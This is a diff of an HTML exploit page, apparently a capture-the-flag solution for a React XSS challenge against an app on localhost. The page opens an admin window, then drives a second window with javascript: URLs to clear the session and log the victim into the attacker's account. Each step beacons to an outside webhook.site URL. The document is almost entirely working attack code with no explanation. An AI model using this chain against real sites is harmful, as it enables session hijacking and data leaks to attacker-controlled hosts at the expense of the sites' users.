@@ -1,6 +1,6 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>dbg</title>
+<title>react2xss-final</title>
 <script>
 const HOOK = 'https://webhook.site/0df0cf2d-361c-41d8-9a41-baab3da0cd73';
 const LOCAL = 'http://localhost:3000';
@@ -11,39 +11,52 @@ function log(msg) {
   new Image().src = HOOK + '?dbg=' + encodeURIComponent(msg) + '&t=' + Date.now();
 }
 
+const creds = JSON.stringify({ username: USER, password: PASS });
+
+const loginJS =
+  "javascript:(async()=>{" +
+  "const send=(m)=>(new Image()).src='" + HOOK + "?j='+encodeURIComponent(m)+'&t='+(Date.now());" +
+  "try{" +
+    "send('js-start:'+location.href);" +
+    "await fetch('/api/auth/login',{" +
+      "method:'POST'," +
+      "headers:{'Content-Type':'application/json'}," +
+      "body:" + JSON.stringify(creds) +
+    "});" +
+    "send('login-ok');" +
+    "location='/'" +
+  "}catch(e){" +
+    "send('login-err:'+String(e))" +
+  "}" +
+  "})();void 0";
+
 log('page-start origin=' + location.origin);
 
-let w = null;
-try {
-  w = window.open(LOCAL + '/', 'flagwin');
-  log('window-open=' + (!!w));
-} catch (e) {
-  log('window-open-err=' + e);
-}
+// 1) 先把 admin DOM 留在 flagwin
+const flagwin = window.open(LOCAL + '/', 'flagwin');
+log('flagwin-open=' + (!!flagwin));
 
-setTimeout(async () => {
+// 2) 再开一个工作窗口
+const workwin = window.open(LOCAL + '/', 'workwin');
+log('workwin-open=' + (!!workwin));
+
+// 3) 先在 workwin 清 session
+setTimeout(() => {
   try {
-    log('before-login-fetch');
-    await fetch(LOCAL + '/api/auth/login', {
-      method: 'POST',
-      mode: 'no-cors',
-      credentials: 'include',
-      headers: {
-        'Content-Type': 'text/plain;charset=UTF-8'
-      },
-      body: JSON.stringify({
-        username: USER,
-        password: PASS
-      })
-    });
-    log('after-login-fetch');
+    log('workwin-clear');
+    workwin.location = "javascript:location='/api/auth/clear';void 0";
   } catch (e) {
-    log('login-fetch-err=' + e);
+    log('workwin-clear-err=' + e);
   }
+}, 600);
 
-  setTimeout(() => {
-    log('before-nav-home');
-    location = LOCAL + '/';
-  }, 3000);
-}, 2500);
+// 4) 再在 workwin 里用 localhost 上下文登录成你的账号
+setTimeout(() => {
+  try {
+    log('workwin-loginjs');
+    workwin.location = loginJS;
+  } catch (e) {
+    log('workwin-loginjs-err=' + e);
+  }
+}, 1600);
 </script>
